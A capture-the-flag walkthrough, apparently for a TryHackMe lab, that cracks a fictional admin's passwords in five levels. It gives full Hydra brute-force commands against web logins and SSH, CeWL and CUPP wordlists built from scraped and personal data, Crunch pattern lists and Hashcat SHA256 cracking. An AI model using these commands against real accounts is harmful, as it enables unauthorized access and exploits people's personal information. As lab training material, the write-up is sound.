# Checkmate

## Introduction

Checkmate is a password cracking challenge consisting of five levels. We are introduced to Marco Bianchi, a systems administrator. The goal is to exploit weaknesses in Marco's authentication practices by finding the passwords for a firewall console, employee portal, a generic social media platform and SSH access to critical infrastructure. 

The main application at http://MACHINE_IP:5000 guides us through each stage of the challenge.

## Level 1

Marco deployed a firewall at firewall.thm:5001, but kept default credentials.
If you are using the AttackBox, don't forget to update the local hosts:

`vim \etc\hosts`

Add AttackBox IP and firewall.thm, and then navigate to firewall.thm:5001.

We are taken to a login page with ADMIN as a username, so I went for low-hanging fruit and tried most commonly used passwords such as 12345, which worked. Login to continue to level 2.

## Level 2

Marco built an internal Employee Login panel on jobs.thm:5002 and used common company keywords as passwords. 

<img width="650" height="584" alt="jobs" src="https://github.com/user-attachments/assets/dc95a9b1-a886-4ff2-8aec-3c5eb0438f29" />

A clue! We need to scrape the Employee Login panel to create a wordlist with CeWL, a Ruby tool that crawls a URL to extract unique words. 

`cewl -d 2 -m 7 --lowercase -w keywords.txt http://jobs.thm:5002`

How this command works: 

`d 2`: Spider two levels deep.

`m 7`: Only include words with seven or more characters.

`--lowercase`: Convert all extracted words to lowercase. 

`-w keywords.txt`: Save extracted words to `keywords.txt`.

`http://jobs.thm:5002`: Target URL for crawling.

To see the words CeWL scraped, check `head keywords.txt`.

Next, I am going to use Hydra to brute-force the employee login page:

`hydra -l marco \
-P keywords.txt \
-f -V -t4 \
-s 5002 \
jobs.thm http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials."`

<img width="1430" height="308" alt="hydra1" src="https://github.com/user-attachments/assets/d1ab4bcd-f0de-4f16-a3fe-f6cf59a65f6f" />

How this Hydra command works:

`l marco`: username.

`-P keywords.txt`: Read passwords from a file.

`-f`: Stop after the first valid credential is found.

`-V`: Print each attempt.

`-t4`: Use four threads.

`jobs.thm`: Employee Login page.

`http-post-form`: module takes the form specification as its argument, with three colon-separated parts:

  1.`/login:`: Path to the login handler.

  2.`username=^USER^&password=^PASS^`: The POST body, using Hydra's `^USER^` and `^PASS^` placeholders.

  3. `Invalid credentials.`: A success condition.

Once logged in, we see some of Marco's personal info.
<img width="1250" height="408" alt="info" src="https://github.com/user-attachments/assets/d717fcb4-3f39-42bc-9be7-c2848a77c402" />



## Level 3

In level 3, we must create a password list out of Marco's personal info. People often create passwords related to their personal info, such as hobbies and birthdays. We'll use CUPP, a tool written in Python that uses an algorithm to predict password patterns to generate a wordlist. 

`git clone https://github.com/Mebus/cupp.git`

`cd cupp`

`python3 cupp.py -i`

We'll enter all the information we know about Marco. 

<img width="1440" height="698" alt="cupp" src="https://github.com/user-attachments/assets/8fb9e41d-53f1-4e41-b4f0-b103877aa0a2" />

I skip through the extras and name the wordlist marco.txt. 

<img width="1378" height="396" alt="cupp2" src="https://github.com/user-attachments/assets/2a774bd7-ad5f-4f5b-ba83-031e6a778efe" />

Once we have the list, we'll retrieve the password with Hydra.

`hydra -l marco \
  -P /root/cupp/marco.txt \
  -f -V -t4 \
  -s 5003 \
  social.thm http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."`

  Login to Marco's profile on Generic Social Media site.

  ## Level 4

On social.thm:5003, Marco recently uploaded a new profile picture. For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png. Your task is to identify the original filename of Marco\u2019s uploaded profile picture. 

In the broswer, find the image using Inspect Page Source:

<img width="1934" height="304" alt="hash" src="https://github.com/user-attachments/assets/1548c6fc-ba62-4be8-ab0a-dd0ebd858d2a" />

The hashed filename is d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png

Save the hash as a file:

`echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash.txt`

Use Hashcat to run a dictionary attack with the infamous rockyou.txt wordlist, which comes from a real breach.

`hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

How this command works:

`-m 1400`: hash type (1400 = SHA256)

`-a 0`: attack mode (0 = dictionary)

`hash.txt`: The file containing the hash.

The final arguement is the wordlist path.

## Level 5

In a post on social.thm, Marco writes: My tip for strong passsord: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark. 

Marco revealed how he creates his passwords, and even included some helpful keywords. We can generate a custom wordlist with Crunch based on Marco's post. Crunch helps to create wordlists by exhausting every possible password based on a specific pattern.

`crunch 13 13 0123456789! -t Security20%%! > passlist.txt; \`

`crunch 15 15 0123456789! -t Excellence20%%! >> passlist.txt; \`

`crunch 15 15 0123456789! -t Innovation20%%! >> passlist.txt; \`

`crunch 12 12 0123456789! -t Digital20%%! >> passlist.txt; \`

`crunch 10 10 0123456789! -t Cloud20%%! >> passlist.txt`

And then use Hydra to brute-force the SSH service:

`hydra -l marco \
  -P passlist.txt \
  -f -V -t4 \
  10.146.184.86 ssh`

  Which will reveal the password.

  # Conclusion

This challenge proves the importance of strong passwords. Users should avoid default credentials, and passwords based on personal information. OSINT techniques can help comb through social media to create specific password lists. Weak passwords help attackers gain access to highly sensitive information, even on systems that are properly configured. 









             











